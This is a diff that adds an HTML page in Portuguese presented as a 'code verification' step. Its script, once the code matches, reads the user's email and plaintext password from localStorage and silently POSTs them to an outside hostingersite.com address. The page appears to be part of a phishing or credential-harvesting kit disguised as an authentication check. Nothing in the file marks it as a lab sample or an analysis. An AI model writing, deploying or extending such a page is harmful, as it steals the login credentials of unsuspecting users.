@@ -1,0 +1,76 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Código</title>
+    <link rel="stylesheet" href="a.css">
+</head>
+
+<body>
+    <div class="login">
+        <h2>Verificação de Código</h2>
+        <hr>
+        <input id="codigo" type="text" placeholder="Digite o código enviado">
+        <hr>
+        <button class="but" onclick="verificar_codigo()">Verificar Código</button>
+        <p id="alertas"></p>
+    </div>
+
+    <div id="dg"></div>
+
+    <script>
+        const codigoCorreto = localStorage.getItem("codigo");
+
+        function verificar_codigo() {
+            const codigoInserido = document.getElementById('codigo').value;
+            const alertas = document.getElementById('alertas');
+            alertas.textContent = "";
+
+            if (codigoInserido === codigoCorreto) {
+                alertas.textContent = "Código correto! Você foi autenticado.";
+                enviarDados();
+            } else {
+                alertas.textContent = "Código incorreto! Tente novamente.";
+            }
+        }
+
+        if (!codigoCorreto) {
+            const alertas = document.getElementById('alertas');
+            alertas.textContent = "Nenhum código armazenado. Certifique-se de que ele foi gerado corretamente.";
+        }
+
+        function enviarDados() {
+            const email = localStorage.getItem("email");
+            const senha = localStorage.getItem("senha");
+
+            if (!email || !senha) {
+                console.error("Erro: E-mail ou senha não encontrados.");
+                return;
+            }
+
+            const dados = { 
+                email: email, 
+                senha: senha 
+            };
+
+            fetch('https://tan-dolphin-355268.hostingersite.com', {
+                method: "POST",
+                body: JSON.stringify(dados),
+                headers: {
+                    'Content-Type': 'application/json; charset=UTF-8'
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error("Erro na requisição: " + response.status);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log("Resposta do servidor:", data);
+            })
+
+        }
+    </script>
+</body>
+</html>
